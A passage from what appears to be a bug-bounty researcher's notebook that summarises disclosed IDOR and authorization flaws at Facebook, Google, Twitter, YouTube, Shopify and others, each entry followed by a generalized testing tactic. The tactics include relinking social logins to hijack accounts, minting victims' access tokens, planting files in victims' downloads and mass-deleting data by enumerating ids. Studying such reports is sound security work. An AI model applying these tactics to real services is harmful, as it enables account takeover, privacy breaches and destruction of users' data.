- Approach/how-found: the connect-FB request had no signature and the response carried the account id. He grabbed a victim's id from their public profile, put it in his connect request, clicked connect → 403 error — but checking via "login with Facebook" logged him into the victim's account. So his Facebook was now linked to the victim's account → ATO without notification; works even if the victim already had FB linked (overwrite).
- Test: social-account-LINK flows that carry an account id with no signature → set it to a victim's id to bind YOUR social login to THEIR account (reverse ATO); always verify the result after a 403/error — the side effect may have succeeded.
- Q: "Can I link my OAuth identity to a victim's account by swapping the account id in the connect request? Did the 403 actually block it, or did the link persist? Does it overwrite an existing connection silently?"

### [354] Project takeover via collaboration invite: `POST /project_api/project_invitation project_id=&role=&emails=`; set `project_id`=victim's, `role=0` (owner), `emails`=mine → I'm invited as OWNER → edit/delete/remove original owner — Hariharan S [NEW ★ invite SELF as owner via role param + foreign project_id]
- Where: `POST /project_api/project_invitation` (`project_id`, `role` [0=owner,1=editor], `emails`).
- Approach/how-found: the invite request let him set the project_id (to a victim's), the role (0=owner), and the invitee email (his own) → received an owner-level invite to the victim's project → full control incl. removing the real owner.
- Test: invite/share/add-member endpoints often expose a `role`/`permission` param AND a container id — set role to the highest value and the container id to a victim's; invite YOURSELF to escalate into resources you don't own.
- Q: "Can I invite myself (my email) to a victim's project/org by swapping the container id, and set role=owner/admin? Is the role value validated against my current rights?"

### [355] $5,000 support-chat IDOR via PARAMETER ELIMINATION: request had `id`+`user_hash`+`email`+`anonymous_id`; swapping `id` errored (most quit here), but stripping ALL values except `email` → valid → server only checks email; swap email → read/send messages + up/download files; trim URL to `/messages/web_v1/conversations_parent` → all conversation ids — Mr.Hacker [NEW ★★ don't quit on first-error; remove params one-by-one; IDOR id can be an email]
- Where: support chat send-message endpoint (`id`,`user_hash`,`email`,`anonymous_id`); `/messages/web_v1/conversations_parent[/<conv_id>]`.
- Approach/how-found: Test I swap `id` → error; Test II remove `user_hash` → "invalid" (hash bound to id); Test III remove id+hash → invalid; Test IV remove everything but `email` (anonymous_id=null) → VALID. So only `email` is authz-checked. Swap email → full access to that user's conversations/files. Path-shortening to `conversations_parent` dumped all conversation ids to append.
- Test: after the "obvious" id-swap errors, systematically DELETE each parameter (and blank others) — the server may fall back to a weaker check (email-only); IDOR keys aren't always numeric (email, hash, anonymous_id); shorten/trim the URL to find list endpoints.
- Q: "If swapping the id fails, what happens when I REMOVE id/hash entirely and leave only email? Which single param does the server actually authorize on? Can I trim the path to a collection endpoint?"

### [356] Shopify (`$storeName` IDOR) — `/shops/<storeName>/revenue_data.json` (Exchange App) leaks revenue/traffic of 8,700+ stores; build the tenant wordlist via FDNS reverse-CNAME of `shops.myshopify.com` — Ayoub Fathi [NEW ★ mass-enumerate ALL tenants via Forward-DNS reverse-CNAME, not just guessing ids]
- Where: Shopify Exchange App internal sales API `/shops/<storeName>/revenue_data.json` (storeName = the IDOR key).
- Approach/how-found: an alert for newly-appearing endpoints surfaced one leaking a store's revenue (legit only because that store was listed for-sale). He realized the endpoint was IDOR over `$storeName`; a fresh store gave 404, so he mass-checked instead — building a wordlist of ALL store names by querying **Forward DNS (FDNS) for reverse-CNAME records of `shops.myshopify.com`** (813,684 entries) → 12,100 exposed, 8,700 vulnerable, revenue from 2015→present.
- Test: for tenant-keyed endpoints, don't guess ids — ENUMERATE the whole tenant population via FDNS reverse-CNAME / reverse-IP of the shared host all tenants point to, then mass-test. Monitor for new endpoints; data that's "public by design" for one object is often IDOR-exposed for all.
- Q: "Is this endpoint keyed on a tenant name/id with no ownership check? Can I enumerate every tenant via FDNS reverse-CNAME of the shared host and mass-harvest? Is 'public for this one' actually leaking for all?"

### [357] Edmodo — view any private class file: PUT edit-post body has `attachments.files[].id`; change it to any file id → that (private) file links to YOUR post and becomes viewable; increment/decrement to sweep — Rohan Pagey [NEW ★ attach a FOREIGN file id to your own object to exfiltrate it]
- Where: `PUT /messages/<postId>` body `{"content":{"attachments":{"files":[{"id":X}]}}}` (api.edmodo.com).
- Approach/how-found: editing a post you own lets you set the attachment file id; pointing it at another class's file id linked that private attachment to your post → viewable without being a class member; ids sequential → enumerate all attachments.
- Test: "edit my object" endpoints that reference child objects by id (attachments, images, files) → swap the child id to a foreign/private one to pull it into your readable object; sequential ids = full sweep.
- Q: "Can I attach someone else's file/attachment id to MY post/object and read it? Are attachment ids sequential to enumerate?"

### [358] Edmodo — two IDORs: delete-comment `comment_ID` swap works ONLY when YOU created the post (weird ownership-scoped authz gap; ids via inspect element); and chat "add to library" `file_ID` swap → add/view any user's exchanged files — Pratyush Sarangi [NEW: ownership-scoped delete IDOR + add-to-library file IDOR]
- Where: delete-comment POST (`comment_ID`); chat "add to library" request (`file_ID`).
- Approach/how-found: (1) only the comment author should delete their comment, but the POST creator could delete ANY comment in their thread by swapping `comment_ID` (got via inspect element) — the check was scoped to post-ownership, not comment-ownership (rationale: post-owner can delete the whole post). (2) "Add this to library" on a chat attachment accepted any `file_ID` (incl. lower ids) → added other users' files to his library → private file disclosure across all users.
- Test: when an action is "allowed in some role context", test it in EVERY context (as post-owner vs commenter) — authz may be checked at the wrong granularity; "save/add to library/import" actions on attachments accept foreign file ids.
- Q: "Does my role over the PARENT (post) wrongly authorize actions on CHILDREN (comments) I don't own? Can 'add to library/save' import another user's file by id?"

### [359] Yahoo Calendar/Notes — "encrypted username" IDOR: `GET /ws/v3/users/<opaque>/items` looked encrypted, but supplying the PLAINTEXT yahoo username (or any other user's) returned their notes — encryption was cosmetic — John H4X00R ($5,000) [NEW ★ opaque id is decorative; server also accepts the cleartext id → downgrade]
- Where: `GET /ws/v3/users/<encrypted-or-plain-username>/items?...` (calendar.yahoo.com).
- Approach/how-found: noticed his username was sent as an opaque encrypted string; on a hunch he replaced it with his plaintext yahoo username → same notes returned; then swapped to a 2nd account's username → its notes. The app encrypted "for the eyes" but accepted plaintext usernames with no check.
- Test: when an id looks encrypted/hashed, try replacing it with the PLAINTEXT equivalent (raw username/email/numeric id) — backends often accept both; the "encryption" may be display-only.
- Q: "Does this endpoint also accept the plaintext username/id instead of the opaque token? Is the encryption actually enforced, or can I downgrade to cleartext and swap?"

### [360] Facebook Creators Studio — pending page roles disclosure: "Manage Page Roles" GET carries `page_id`; swap to any victim page → names + user ids of users invited to roles (incl. celebrity pages) — Avinash Kumar ($4,000) [DUP-reinforce: admin settings panel keyed on page_id]
- Where: Creators Studio "Manage Page Roles" GET request, `page_id` parameter.
- Approach/how-found: captured requests in the new Creators Studio; the manage-roles GET had a controllable `page_id`; swapping it returned pending role-invite names/ids for any page even with no role on it.
- Test: newly launched admin tools/dashboards (Creators Studio, beta consoles) often miss authz — capture every request and swap the container id (`page_id`/`account_id`).
- Q: "Do new/beta admin panels enforce authz on the container id? Can I read another page's roles/invites/settings by swapping page_id?"

### [361] CI/CD webhooks — delete any of 30,000+ via sequential id: `PUT /projects/<id>/notifications` (delete-webhook) carries an incremental webhook id; Intruder the id → delete all users' webhooks — Gujjuboy10x00 [DUP-reinforce: sequential id in a DELETE/state-change body → mass destruction]
- Where: `PUT /projects/<projectId>/notifications` body with sequential webhook id (`notifier:"deletewebhook"`).
- Approach/how-found: webhook ids were sequential (e.g. 1588211); created a 2nd account + webhooks, swapped the id in the delete request → deleted the other account's webhook; Intruder over `$ID$` → delete everyone's (30k+).
- Test: state-changing endpoints (delete/disable/cancel) with sequential ids in the body are mass-destruction IDORs — enumerate to gauge blast radius (even "old"/hardened targets miss these).
- Q: "Is the id in this delete/disable request sequential? Can I enumerate it to affect all users? Is this destructive action authz-checked at all?"

### [362] Google Earth Studio — insert malware into ANY user's Projects Archive: folder IDs are incremental → save your project into a victim's folder (swap `folder` id); your `data` JSON is written verbatim into their downloadable `.esp`; set data to a `<script>`/exe payload; null-byte the project name (`file.html\u0000`) so the archive file ends `.html`/.sh → victim downloads "their" archive and runs it — websecblog [NEW ★★ write-into-foreign-folder + null-byte filename + payload delivered via trusted download]
- Where: save-project POST (`folder` = incremental id, `name`, `data`); Projects Archive zip (`<name>.esp`).
- Approach/how-found: folders had incremental ids; setting `folder` to another user's id saved your project into their account (hidden in UI, but present in their Projects Archive zip). `data` is reflected into the file; `name` controls the filename. Appending `\u0000` to the name (JSON allows it; Google didn't strip it) truncated the extension → `evil.html`/`evil.sh`. Result: arbitrary malicious files seeded into every user's "download a copy of all your projects" archive.
- Test: incremental folder/container ids let you WRITE objects into others' accounts; if object content is later exported/zipped, you have stored injection; try null-byte (`\u0000`) to control file extensions; think about delivery via a TRUSTED download the victim initiates.
- Q: "Can I save/write my object into a victim's container by swapping the folder id? Is my content reflected into an export they'll download? Can I control the filename/extension (null byte) to make it executable?"

### [363] Facebook — cross-site identity oracle: find AJAX endpoints lacking CORS/JSON-hijack protection that take a `user_id` in the URL and respond DIFFERENTLY when it matches the logged-in user → any web page confirms whether a visitor is a specific FB user (~500 checks/sec) — Tom Anthony ($1,000) [NEW ★ behavioral-difference oracle on UID-in-URL endpoints → deanonymization]
- Where: unprotected backend AJAX endpoints / images whose URL contains the user id and behave differently on match.
- Approach/how-found: searched FB for endpoints missing `access-control-allow-origin`/JSON magic-prefix protections that embedded the user id; one behaved differently when the UID equaled the logged-in user → a remote page can probe a list of UIDs and learn which the visitor is logged in as.
- Test: hunt endpoints/images that (a) embed a user/object id and (b) succeed-vs-error depending on whether it's "yours" — these are cross-site oracles for identity/membership even without reading data; check CORS + JSON-hijack defenses.
- Q: "Is there an endpoint that returns different results when the id is mine vs not, and is it readable cross-origin? Can I use that difference as a yes/no oracle for identity/ownership?"

### [364] Facebook CTF (FBCTF) — `/data/attachment.php?id=<seq>` serves INACTIVE flag attachments (which contain the flag) with no active-state check → read flags before they go live — George Osterweil [NEW: file endpoint ignores draft/inactive/scheduled state; sequential id]
- Where: `GET /data/attachment.php?id=<n>` on the CTF platform; `genGenerateData()` checked only that the attachment exists, not that its flag is active.
- Approach/how-found: in a live CTF, clicked an active flag's attachment, captured it in Burp, changed `id` to an inactive flag's id (sequential, brute-able) → it served the not-yet-released attachment containing the flag, enabling early solve. Source confirmed: existence check but no `checkActive()` (the fix added `&& $active === true`).
- Test: download/attachment/file endpoints frequently authorize "does it exist?" but not "is it published/active/scheduled/owned?". Swap the id to draft/inactive/future objects; sequential ids make it trivial. Applies to any "scheduled content/embargoed report/unreleased item".
- Q: "Does this file/attachment endpoint check the object's published/active/scheduled state and ownership, or just that the id exists? Can I read draft/embargoed items early by id?"

### [365] Facebook — bypass DYI password confirmation: `/dyi/download2/` requires step-up password, but the sibling `/photos/album/download/file/?album_id=1&dyi_job_id=<JOB_ID>` returns the same data with NO confirmation → session-only attacker exfiltrates all victim info silently — Youssef Sammouda [NEW ★ two endpoints for one resource; one enforces step-up auth, the other doesn't]
- Where: DYI download `POST /dyi/download2/` (password-gated) vs `GET /photos/album/download/file/?album_id=1&dyi_job_id=<JOB_ID>&notif_t=photo_album_download` (not gated).
- Approach/how-found: downloading a generated "Download Your Information" archive required password re-entry; but the album-download endpoint accepted the same `dyi_job_id` and returned a valid download URL WITHOUT password confirmation. An attacker with only a stolen session (no password) thus exfiltrates everything, and can delete the DYI request afterward so the victim never notices (no password/email change to trip alerts).
- Test: when a sensitive action is protected by step-up auth (password/2FA/OTP re-entry), look for an ALTERNATE endpoint that produces the same artifact (export/album/report/legacy path) without the step-up. Reuse the same job/file id across endpoints.
- Q: "Is the step-up auth enforced on every path to this data, or does a sibling/legacy/export endpoint return it with just my session? Can I move the file/job id to the unprotected endpoint?"

### [366] Facebook Messenger/Portal — disclose ANY user's private attachments: `POST /messaging/send/` carries `image_ids[0]=<id>`; swap to another user's attachment id → their image/file/video/audio is disclosed; works across main chat, Messenger, Workplace, Portal — Sarmad Hassan ($15,000) [NEW ★ reference a foreign attachment id in YOUR send-message → exfiltrate; cross-product reuse]
- Where: `POST /messaging/send/` body `image_ids[0]`/attachment-id params (www.facebook.com).
- Approach/how-found: testing Portal's support-chat upload, the send request referenced his uploaded image by `image_ids[0]`; swapping that id to another user's attachment id returned/attached THEIR private media. Same flaw across all FB chat infrastructures. (Quirk: only reproduced by replaying live in the Proxy tab, not Repeater.)
- Test: send/compose endpoints that reference your uploads by id → swap to a foreign attachment id to disclose it; attachment ids are brute-able (mass exposure); try the same flaw across sibling products sharing the backend.
- Q: "Does the send/compose request reference attachments by a swappable id? Can I attach/disclose someone else's media id? Does the same backend (and bug) serve multiple products?"

### [367] YouTube Studio — two IDORs: bulk-update POST `videoIds[]` not ownership-checked → change ANY video's title/desc/visibility (set private = kill a channel; edit Despacito; inject donation links); and the video-edit "playlists" POST `channelId` swap → any user's UNLISTED playlists — Alexandru Coltuneac [NEW ★ bulk-action array IDOR (mass impact) + channelId swap leaks unlisted]
- Where: YT Studio "Update in Bulk" POST (`videoIds[]`/`videos`); video-edit playlists POST (`channelId`).
- Approach/how-found: the bulk-edit toolbar sent a JSON body with a `videoIds` array; the backend never checked he owned those videos → set any video id → change its settings (visibility→private shuts down channels; edit popular videos). Separately, the playlists-populate request took a `channelId`; swapping it returned that channel's public+unlisted playlists (privacy leak).
- Test: bulk/batch operations (update-in-bulk, multi-select) take an ARRAY of ids — inject foreign ids; backends often authz the action but not each array element. Endpoints taking a `channelId`/`accountId` to "populate" UI leak unlisted/private children.
- Q: "Does a bulk/multi-select action verify ownership of EVERY id in the array, or just that I'm logged in? Can I swap `channelId` to read another account's unlisted/private items?"

### [368] Facebook — deprecated translations dashboard ignores its `app_id` scope and dumps ~20,000 in-development apps' ids/names/translation requests: `GET /translations/admin/?app_id=<owned>` — Youssef Sammouda [NEW ★ deprecated admin panel honors the param's presence but returns GLOBAL data; leaks unpublished objects]
- Where: `GET /translations/admin/?app_id=<your-app-id>` (a deprecated developer translations panel).
- Approach/how-found: the panel was meant to return only the specified app's translation requests, but supplying any owned `app_id` returned ALL apps — including private/in-development ones — with names, ids, and translation strings (~20k apps; an in-dev app appeared merely for having added the "App Center" product). Idea/financial leak + ids usable to chain further bugs.
- Test: hunt deprecated/legacy admin or reporting dashboards; supply the minimum valid scoping value (`app_id`, `org_id`, `account_id`) and check whether the response is correctly scoped or globally over-returns. Unpublished/in-dev objects leaking here are high impact.
- Q: "Does this admin/reporting panel actually scope to my `app_id`/`org_id`, or does any valid value return everyone's data — including unpublished/in-development objects?"

### [369] KnowYourMeds — profile PUT path IDOR: `PUT /api/v1/user/3892/profile` → change 3892→3891 returns another user's username/email; Burp Intruder 3800–3900 → thousands of users — Rupika Luhach [DUP-reinforce: sequential id in REST path + Intruder to prove scale]
- Where: `PUT /api/v1/user/<id>/profile` (id in path, also in body).
- Approach/how-found: edit-profile sent a PUT with a sequential user id in the path; decrementing returned the neighbor's data; Intruder over a range pulled all registered users' email+username.
- Test: REST `/user/<id>/...` paths with sequential ids — decrement/increment, then Intruder a range to demonstrate full-DB impact (turns a "you just changed an id" into a mass-PII finding).
- Q: "Is the user id in the path sequential? Can I sweep a range to extract all users' PII and quantify blast radius?"

### [370] Twitter — publish tweets AS ANY user: ads.twitter.com tweet-publish request has `owner_id`/`user_id`/`media_key`; swapping owner/user errors "not owner of this media-file" — bypass by SHARING your media file with the victim (the share makes them an 'owner') → publish to their timeline; get your own media_key since you own the file — Kedrisec ($7,560) [NEW ★★ abuse a SHARE feature to satisfy the ownership check that blocks the IDOR]
- Where: ads.twitter.com tweet-publish (GET+POST) params `account_id`,`owner_id`,`user_id`,`media_key`.
- Approach/how-found: changing owner_id/user_id to the victim hit "owner_id is not an owner of this media_file"; media_key is 18 digits (un-brute-able). Insight: the library's "share media with a user" feature makes the recipient a co-owner → share your file with the victim, then publish with owner_id/user_id=victim and YOUR known media_key → tweet posts on the victim's timeline.
- Test: when an IDOR is blocked by an ownership check on a secondary object (media/file), look for a SHARE/collaborate/transfer feature that legitimately grants the victim ownership of YOUR object — then the check passes; use objects you own so secret ids (media_key) are visible to you.
- Q: "Is there an ownership check on a secondary object blocking this? Can a share/invite/transfer feature make the victim an 'owner' of MY object to satisfy it? Do I own a version so the secret id is visible?"

### [371] AntiHack — create submissions on ANY program (even LOCKED) via `comp_id` swap: generate comp_ids, Intruder the create-submission request → bypass program lock — Syahrul Akbar [DUP-reinforce: create-action IDOR bypasses an access restriction, not just reads]
- Where: create-submission POST, `comp_id` parameter.
- Approach/how-found: intercepted "create submission", found `comp_id`; generated a list of ids and Intruder'd → created submissions against programs he wasn't allowed into, including locked ones.
- Test: "create/submit/join" actions keyed on a container id (`comp_id`/`program_id`) — swap to act on restricted/locked/private containers; access restrictions enforced only in the UI are bypassable via the raw request.
- Q: "Can I create/submit into a locked/private container by swapping its id in the create request? Is the lock enforced server-side or only in the UI?"

### [372] Privilege escalation to SUPERUSER: admin "create user" POST takes `roleId`; admin may only create moderator(3)/vendor(4), but sending `roleId=1` created an account ABOVE admin; then EVERY admin endpoint (`PUT /admin/role-permissions`, `GET /users/<id>`) is callable by low-priv users with their own session — Gaurav Narwani [NEW ★ role mass-assignment beyond your grant + function-level authz missing everywhere]
- Where: admin create-user POST (`roleId`); `PUT /admin/role-permissions` (`{roleId,permissionId}`); `GET /users/<id>`.
- Approach/how-found: the create-user form only let admin pick roles 3/4; tampering `roleId` to 1 minted a superuser (more than admin). Then he replayed admin-only endpoints as moderator/vendor sessions — none checked function-level authz → low-priv users could add/delete roles, grant permissions, and read any user by id.
- Test: in role-bearing create/update requests, set the role to values OUTSIDE your allowed set (1/0/superadmin); after finding one privesc, replay ALL privileged endpoints with a LOW-priv session to map function-level authz gaps (vertical IDOR).
- Q: "Can I assign myself a role higher than the UI offers (roleId=1)? Do privileged endpoints check the caller's role, or just that the request is well-formed? Which admin actions work with my low-priv session?"

### [373] Facebook — disclose a page's admins + Monetization PAYOUT details (company name, financial id) via `POST /media/manager/monetization/payout_settings/` `page_ids[]=<targets>` — Youssef Sammouda [DUP-reinforce: financial/monetization endpoint takes an id-array, no ownership check; financial_id reusable downstream]
- Where: `POST /media/manager/monetization/payout_settings/` body `page_ids[]` (array of target page ids); works if the page has Monetization on.
- Approach/how-found: the payout-settings endpoint accepted an arbitrary list of `page_ids` and returned each page's admins plus payout details (company name, added date, **financial id**) — the financial id then unlocks further income-detail leaks.
- Test: monetization/payout/billing endpoints that take a `page_ids`/`account_ids` array rarely re-check ownership per element — submit target ids and read financials; harvested financial/account ids feed deeper attacks.
- Q: "Does this payout/billing endpoint accept an array of ids and return each one's financials without checking I own them? What downstream call does the leaked financial_id unlock?"

### [374] Facebook — disclose any page's violation history + Ad-break eligibility with NO role on the page: `POST /creator/monetization/eligibility_info/` `creator_id=<target page>` — Youssef Sammouda [DUP-reinforce: monetization-eligibility keyed on creator_id, no role check]
- Where: `POST /creator/monetization/eligibility_info/` body `creator_id=<target page id>`.
- Approach/how-found: a user with no role on a page could send the target's `creator_id` and learn whether it's eligible for monetization plus its violation count/details — reputation-sensitive data.
- Test: "eligibility/status/health/insights" endpoints for a page/account/creator are frequently keyed on a single id with no membership check — swap `creator_id`/`page_id` to read another entity's compliance/violation state.
- Q: "Can I read another page/account's eligibility, violations, or health status by swapping its id, with no role on it?"

### [375] Facebook — disclose the Instagram business account linked to ANY page (no role needed): `POST /business/instagram/lightweight_business_info/` `page_id=<target>` — Youssef Sammouda [DUP-reinforce: "lightweight/info" endpoint keyed on page_id, admin-only data, no membership check]
- Where: `POST /business/instagram/lightweight_business_info/` body `page_id=<target page>`.
- Approach/how-found: the endpoint returned a page's linked IG business account info to anyone supplying the `page_id`, though it's meant for page admins only — useful recon for further attacks.
- Test: endpoints named "info/lightweight/summary/preview/lookup" tend to skip authz; swap the `page_id`/`account_id` to read another entity's linked-accounts/relationships.
- Q: "Does this info/summary endpoint return admin-only relationship data (linked accounts) for any id I supply, with no role check?"

### [376] Facebook — expose a commerce page's business email + payment-account BALANCE via `GET /commerce/contact_merchant_onboard_status/?page_id=<target>` (worked for the 2C2P provider, not PayPal/Stripe) — Youssef Sammouda [NEW ★ provider-specific authz gap: same endpoint checks some payment providers, misses one]
- Where: `GET /commerce/contact_merchant_onboard_status/?page_id=<target>` (returns onboarding status per payment provider).
- Approach/how-found: the endpoint returned merchant onboarding details for a page; for the **2C2P** provider it leaked the business email (used to log into the provider dashboard → takeover) and the current account balance, while the same endpoint correctly withheld these for PayPal/Stripe — an inconsistent per-provider check.
- Test: when an endpoint handles multiple providers/integrations/types, test EACH variant — authz is often implemented per-provider and one is forgotten. Payment "onboarding status" can leak email (account-takeover seed) + balance.
- Q: "Does this multi-provider endpoint enforce ownership for every provider, or does one (less common) provider leak the merchant's email/balance?"

### [377] Facebook — boolean oracle: determine if any merchant page has pending/completed orders via `POST /commerce/merchant/orders/download/` (`merchant_settings_id` from GraphQL `node(page_id){preferred_merchant_settings{id}}`, `order_states=70|78`); 500-error vs empty-CSV reveals the answer — Youssef Sammouda [NEW ★ status-code/response-shape as an info-leak oracle + GraphQL node() to fetch the needed id]
- Where: `POST /commerce/merchant/orders/download/` with `merchant_settings_id`, `start_date`/`end_date` (epoch), `order_states` (70=completed, 78=pending); id via `graphql?q=node(<page_id>){preferred_merchant_settings{id}}`.
- Approach/how-found: the orders-download endpoint didn't return others' orders outright, but its **behavior differed**: an empty CSV (with headers) meant no orders; a `500` error meant the merchant HAD orders in that window → a reliable yes/no oracle on private merchant activity. He first used GraphQL `node()` to resolve the required `merchant_settings_id`.
- Test: even when an endpoint won't hand over data, compare response codes/sizes/timing across inputs — a consistent 500-vs-200 or empty-vs-error difference is an information-disclosure oracle. Use GraphQL `node(<id>)` to fetch companion ids other endpoints require.
- Q: "Does this endpoint leak a yes/no (or count) about another entity via differing status codes/response shapes, even if it won't return the rows? Can GraphQL node() give me the companion id it needs?"

### [378] Facebook — generate an access token for ANY user (type-confusion): the Rights-Manager endpoint returns a token for a given `page_id` but never checks the id is a PAGE, so a `user_id` mints that user's token → read emails, cards, phones, managed pages/tokens, ad accounts, private media — Youssef Sammouda [NEW ★ object-TYPE confusion: endpoint expects a page id, accepts a user id, issues a token for the wrong object]
- Where: a Rights Manager (video publishers/editors) endpoint that issues a page `access_token` for a `page_id`.
- Approach/how-found: found by accident while testing Rights-Manager calls — the token-minting endpoint didn't verify that `page_id` referenced a page rather than a user. Supplying any Facebook user id returned an access token scoped to that user; though page-scoped (no DM read / full ATO), it exposed emails, credit cards, phone numbers, managed pages and THEIR tokens, business/ad accounts, and private posts/photos/videos.
- Test: token/credential/resource endpoints that take an id of one type (`page_id`,`app_id`,`asset_id`) often don't validate the id's TYPE — feed an id of a different type (a `user_id`) and see if it issues a token or returns the wrong object. Inspect the resulting token's scopes for what it unlocks.
- Q: "Does this endpoint validate the TYPE of the id (page vs user vs app), or will it mint a token / return an object for a different object type than intended?"

### [379] Facebook Workplace — logo id → owner name via object type-confusion: upload an event cover picture, then replace its `fbid` with another workplace's LOGO id → response leaks that workplace's owner/admin name — Ajay Gautam [NEW: feed an id of type A into a context expecting type B to leak its metadata]
- Where: event cover-picture object URL, `fbid` parameter set to a foreign workplace-logo id.
- Approach/how-found: a workplace logo's id is the admin's id; he created an event, uploaded a cover photo, then swapped the photo `fbid` to another workplace's logo id → the rendering exposed the owner's name.
- Test: swap object ids ACROSS types (photo↔logo↔video↔doc) — a viewer for type A may resolve a type-B id and leak its owner/metadata; ids that "are" a user (logo=admin id) leak identity.
- Q: "Can I put a different object-type's id into this viewer to leak its owner/metadata? Is any id actually a user/admin id in disguise?"

### [380] OTP/verification-code disclosure via `customerID` swap: signup verification page has `customerID` in URL; the RESEND-code request returns the confirmation code in its response, and is keyed only on `customerID` (poorly serialized → direct object) → change 6204→6203 to read other users' OTPs — vulnerables [NEW ★ resend-OTP response leaks the code; swap the account id]
- Where: signup "resend code" request, `customerID` only → response contains the code.
- Approach/how-found: the verify page carried `customerID`; the resend-code request (just `customerID`) returned the confirmation code in its RESPONSE; since the value maps directly to the account object, swapping `customerID` exposed other users' verification codes.
- Test: OTP/verify/resend endpoints sometimes return the code in the response body — check; if keyed on a swappable account/customer id, you can read others' codes (→ account creation/ATO).
- Q: "Does the send/resend-OTP response leak the code itself? Is it keyed on a swappable customer/account id I can decrement to read other users' codes?"

### [381] Vine/Twitter — harvest any user's IP via reposted-vine id: endpoint returns `ipAddress` as a DECIMAL/long (e.g. 2130706433 = 127.0.0.1); copy a reposted vine's POST id into the endpoint → decode the decimal → real IP — Prial ($5,040) [NEW: sensitive field present but encoded (decimal IP); object referenced by repost id]
- Where: vine detail endpoint keyed on a (reposted) post id; response field `ipAddress` in decimal form.
- Approach/how-found: the response held `ipAddress` as a long integer; converting decimal→dotted-quad gave the poster's real IP. Any reposted vine's id worked → harvest many users' IPs. (Companion to his earlier $7,560 PII leak.)
- Test: scan API responses for sensitive fields in non-obvious encodings (decimal/long IPs, base64, epoch); object ids harvested from public reposts/shares feed the lookup.
- Q: "Does the response contain sensitive data in an encoded form (decimal IP, base64)? Can I source object ids from public reposts/shares to enumerate users?"

### [382] Google Gallery — delete any user's collection: delete API takes `project_id`+`collection_id`; `collection_id` isn't ownership-checked → swap to a victim's collection_id → their collection deleted — Yogesh Tantak [DUP-reinforce: destructive IDOR on a child id while the parent id is yours]
- Where: Gallery delete endpoint (`project_id` [yours] + `collection_id` [swapped]).
- Approach/how-found: the delete API verified nothing about `collection_id` ownership; replacing his collection id with another user's → deleted theirs.
- Test: when a destructive call takes both a parent (project) and child (collection) id, the parent may be authz'd but the child isn't — swap only the child id.
- Q: "In delete/remove calls with parent+child ids, is the CHILD id ownership-checked, or only the parent? Can I delete a foreign child under my own parent?"

### [383] Forced-browse to hidden `/user` + id-in-URL edit → ATO of all users and admin panel: SSO app exposed `/user` and `/admin` dirs; the user-edit page took a userid in the URL (change to 16390) → change that user's password/email; `/admin` → admin panel password/email change — addictivehackers ($1,500) [NEW: directory discovery + edit-by-id = mass ATO + admin takeover]
- Where: hidden `/user?...id=<n>` edit page; `/admin` panel.
- Approach/how-found: the SSO-protected app had no self-edit UI, but browsing to `/user` revealed an edit page keyed on userid; swapping the id let him change any user's password/email (ATO); `/admin` exposed the admin panel with the same power.
- Test: brute hidden directories (`/user`,`/admin`,`/portal`); edit/settings pages keyed on a URL id let you change password/email of any user (and admin) → ATO.
- Q: "Are there hidden admin/user directories? Does an edit page take a userid in the URL I can swap to change someone's password/email? Is the admin panel just forced-browse away?"

### [384] Google (3 bugs) — invite SPOOFING via typo'd `userStoinvite` param (multi-invite + `Name<email>` syntax → fake sender); Slides LEGACY image API (photo→cosmoId→direct link) missing authz → any Drive image by file id with another cookie; Photos partner-share `request` is base64 padded with `.` not `=` → decode, swap email, re-encode → victim's photos shared to attacker silently — Gergő Turcsányi ($3,133.70) [NEW ★★ typo/extra-param + legacy-endpoint authz gap + non-standard base64 padding tamper]
- Where: Docs "request access" `userStoinvite`; Slides image endpoints (`photo`→`cosmoId`); Photos partner-sharing URL `request` (base64 with trailing `.`).
- Approach/how-found: (1) the request-access modal reflected a misnamed `userStoinvite` param that accepted COMMA-separated addresses and `DisplayName<real@addr>` syntax → craft a spoofed invite appearing to come from your ex-boss. (2) Methodically replayed every Google product's XHR with a different account's cookies; Slides used legacy image endpoints lacking authorization → fetch any Drive image by file id. (3) Photos partner-share encoded the target email in a `request` param that was base64 but used `.` as padding instead of `=`; swapped `.`→`=`, decoded, changed the email to his, re-encoded, `.` back → after the victim logs in, their library is shared to the attacker with NO notification.
- Test: scrutinize odd/misnamed params (`userStoinvite`) and `Name<email>` display syntax for spoofing; replay legacy/duplicate API endpoints with another session's cookies (authz often missing on old paths); recognize non-standard base64 (trailing `.`/`-`/`_`) — normalize padding, decode, tamper, re-encode.
- Q: "Are there extra/misnamed params or display-name syntaxes I can abuse to spoof? Do legacy/duplicate endpoints skip authz when replayed with another cookie? Is an opaque blob actually base64 with weird padding I can decode and edit?"

### [385] Facebook — generate an access token for ANY user via object type-confusion: the Rights-Manager endpoint returns a PAGE access_token for a `page_id`, but doesn't check the id is a page → set `page_id` = a user id → get that USER's access token → read emails/credit-cards/phones/private posts/managed assets — Samm0uda [NEW ★ token-minting endpoint accepts the wrong object type → token for a victim]
- Where: Rights-Manager token endpoint, `page_id` (set to a user id).
- Approach/how-found: the endpoint minted a page token by `page_id`; supplying a user id instead returned a token scoped to that user → broad private-data read (not full ATO since scopes were page-level).
- Test: token/credential-minting endpoints that take an object id (`page_id`/`app_id`/`asset_id`) — feed an id of a DIFFERENT type (user) to mint a token for it; check what the resulting token can read.
- Q: "Does a token-generating endpoint validate the object TYPE of the id? Can I pass a user id where a page/app id is expected to mint a token for a victim?"

### [386] Change anyone's profile picture: upload reveals your `id` (84) in the request; victim is 85; re-upload with `id=85` → victim's avatar replaced — Rupika Luhach (Bugdiscover) [DUP-reinforce: learn your id from your own write, then ±1 to hit neighbors]
- Where: profile-image upload request, `id` parameter (sequential).
- Approach/how-found: uploaded his own photo to observe the assigned `id` (84), inferred the victim's (85), re-sent the upload with `id=85` → changed the victim's picture.
- Test: do a write on your own object to learn the id format/value, then ±1 to act on adjacent users; upload/replace endpoints often trust a client-supplied owner id.
- Q: "Does my own upload expose my numeric id? Does the upload trust a client `id` I can change to a neighbor's?"

### [387] Uklon (HackenProof) — driver-image IDOR by `uid` (edit/delete/upload any driver's avatar, type `driveravatar`); feedback IDOR by SEQUENTIAL id (`PUT /api/v1/feedbacks`, `GET /api/v1/drivers/<id>/feedbacks`) → edit/delete any driver's reviews, `id+1` sweep deletes ALL reviews → manipulate competitor ratings — multiple researchers [NEW: business-impact framing — rewrite competitors' reviews]
- Where: driver avatar endpoint (`uid`); `/api/v1/feedbacks` (sequential id); `/api/v1/drivers/<driverId>/feedbacks`.
- Approach/how-found: the avatar action keyed on a driver `uid` with no ownership check (edit/delete/upload anyone's). Feedback ids were a simple increment → edit/delete any comment; a competitor driver could swap positive↔negative reviews and wipe all feedback by enumerating ids.
